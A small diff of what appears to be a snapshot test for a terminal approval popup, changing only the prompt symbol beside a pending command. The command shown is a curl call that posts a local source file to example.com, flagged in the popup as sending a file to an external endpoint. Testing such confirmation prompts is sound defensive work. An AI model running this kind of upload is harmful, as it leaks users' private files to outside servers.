@@ -7,7 +7,7 @@ expression: popup
 
 
   Command                                                        Rationale
-› curl -sS --data-binary @core/src/codex.rs https://example.com  Would send a local source file to an external
+❯ curl -sS --data-binary @core/src/codex.rs https://example.com  Would send a local source file to an external
                                                                  endpoint.
 
   Press enter to confirm or esc to go back
